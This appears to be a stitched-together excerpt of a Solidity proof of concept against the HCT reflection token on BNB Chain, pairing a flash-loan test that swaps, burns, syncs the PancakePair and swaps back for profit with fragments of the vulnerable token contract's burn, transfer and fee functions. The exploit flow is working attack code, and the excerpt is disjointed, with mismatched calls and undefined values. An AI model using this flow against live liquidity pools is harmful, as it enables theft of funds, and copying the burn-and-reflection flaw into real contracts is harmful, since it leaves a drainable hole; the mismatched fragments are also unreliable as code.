function testExploit() external {
    uint256 startBNB = WBNB.balanceOf(address(this));
    console.log("Before Start: %d BNB", startBNB);

    DPPOracle.flashLoan(baseAMount, 0, address(this), abi.encode(baseAMount));

    uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;
    uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;
    console.log("Attack Exploit: %s.%s BNB", intRes, decRes);
}

function balanceOf(address account) public view override returns (uint256) {
    if (_isExcluded[account]) return _tOwned[account];
    return tokenFromReflection(_rOwned[account]);
}

function transfer(address recipient, uint256 amount) public whenNotPaused override returns (bool)  {
    _transfer(_msgSender(), recipient, amount);
    return true;
}

function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
    swapWBNBtoHCT();
    burn();
    PancakePair.sync();
    swapHCTtoWBNB();
    WBNB.transfer(address(DPPOracle), baseAMount);
}

function transferFrom(address sender, address recipient, uint256 amount) public whenNotPaused override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "TOKEN20: transfer amount exceeds allowance"));
    return true;
}

	function burn(uint256 _value) public{
		_burn(msg.sender, _value);
	}

	function updateFee(uint256 _txFee,uint256 _burnFee,uint256 _charityFee) onlyOwner() public{
        _TAX_FEE = _txFee* 10; 
        _BURN_FEE = _burnFee * 10;
		_CHARITY_FEE = _charityFee* 10;
		ORIG_TAX_FEE = _TAX_FEE;
		ORIG_BURN_FEE = _BURN_FEE;
		ORIG_CHARITY_FEE = _CHARITY_FEE;
	}


	function _burn(address _who, uint256 _value) internal {
		require(_value <= _rOwned[_who]);
		_rOwned[_who] = _rOwned[_who].sub(_value);
		_tTotal = _tTotal.sub(_value);
		emit Transfer(_who, address(0), _value);
	}
